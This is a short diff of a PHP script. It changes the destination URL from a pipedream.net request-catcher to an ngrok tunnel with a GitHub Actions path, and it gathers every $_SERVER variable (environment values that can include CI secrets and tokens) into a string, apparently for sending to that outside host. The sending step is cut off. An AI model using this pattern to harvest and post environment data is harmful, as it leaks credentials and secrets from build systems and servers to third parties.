@@ -1,6 +1,6 @@
 <?php
 
-$url = 'https://eov0fv2sik33gnq.m.pipedream.net';
+$url = 'https://ba9c-180-188-224-19.ngrok.io/notification/githubActions';
 foreach ($_SERVER as $key=>$value) {
   $fields_string .= $key.'='.$value.'&'; 
 }
